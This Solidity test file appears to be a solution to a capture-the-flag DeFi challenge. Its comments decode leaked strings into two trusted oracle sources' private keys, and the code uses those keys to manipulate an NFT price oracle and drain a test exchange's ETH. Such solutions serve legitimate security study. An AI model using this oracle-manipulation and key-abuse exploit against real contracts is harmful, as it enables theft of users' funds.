// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/DoubleAgentFixture.sol";

contract DoubleAgent is DoubleAgentFixture {

    function setUp() public override {
        super.setUp();        
    }

    function test_doubleAgent() public {

        /**
         * Code your exploit here
         */
        /*
            ---- Steal all the funds from the exchange ----
            Trying to decode the response:
            Step 1: Hex -> ASCII
            1: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
            2: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
            Step 2: ASCII (Base64) -> Data (Private Key)
            1: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
            2: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
            Step 3: Private Key -> Address
            1: 0xe92401a4d3af5e446d93d11eec806b1462b39d15 (Trusted Source 2)
            2: 0x81a5d6e50c214044be44ca0cb057fe119097850c (Trusted Source 3)
            With the private keys of the sources we are able to change the price of the NFTs with the postPrice function
         */
        // Step 1: We get the addresses from the private keys
        address source2 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        address source3 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
        emit log_address(source2);
        emit log_address(source3);

        // Step 2: We change the NFT with both sources
        vm.startPrank(source2);

        trustfulOracle.postPrice("DCNFT", 1);

        vm.stopPrank();

        vm.startPrank(source3);

        trustfulOracle.postPrice("DCNFT", 1);

        vm.stopPrank();

        // Step 3: As the attacker we buy one NFT
        vm.startPrank(attacker);

        exchange.buyOne{value: 1 wei}();

        vm.stopPrank();

        // Step 4: We change the NFT with both sources again to set the price equal to the total amount of tokens in the exchange
        vm.startPrank(source2);

        trustfulOracle.postPrice("DCNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);

        vm.stopPrank();

        vm.startPrank(source3);

        trustfulOracle.postPrice("DCNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);

        vm.stopPrank(); 

        // Step 4: As the attacker we sell the NFT, first we have to approve the transfer
        vm.startPrank(attacker);

        defiCtfNFT.approve(address(exchange), 0);
        exchange.sellOne(0);

        vm.stopPrank();

        // Step 5: We set the price as it was at the beginning
        vm.startPrank(source2);

        trustfulOracle.postPrice("DCNFT", INITIAL_NFT_PRICE);

        vm.stopPrank();

        vm.startPrank(source3);

        trustfulOracle.postPrice("DCNFT", INITIAL_NFT_PRICE);

        vm.stopPrank();

        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Exchange lost all ETH
        assertEq(address(exchange).balance, 0);
        // Attacker's balance has increased significantly
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        // Attacker does not own any NFT
        assertEq(defiCtfNFT.balanceOf(attacker), 0);
        // NFT price hasn't changed
        assertEq(trustfulOracle.getMedianPrice("DCNFT"), INITIAL_NFT_PRICE);
    }
}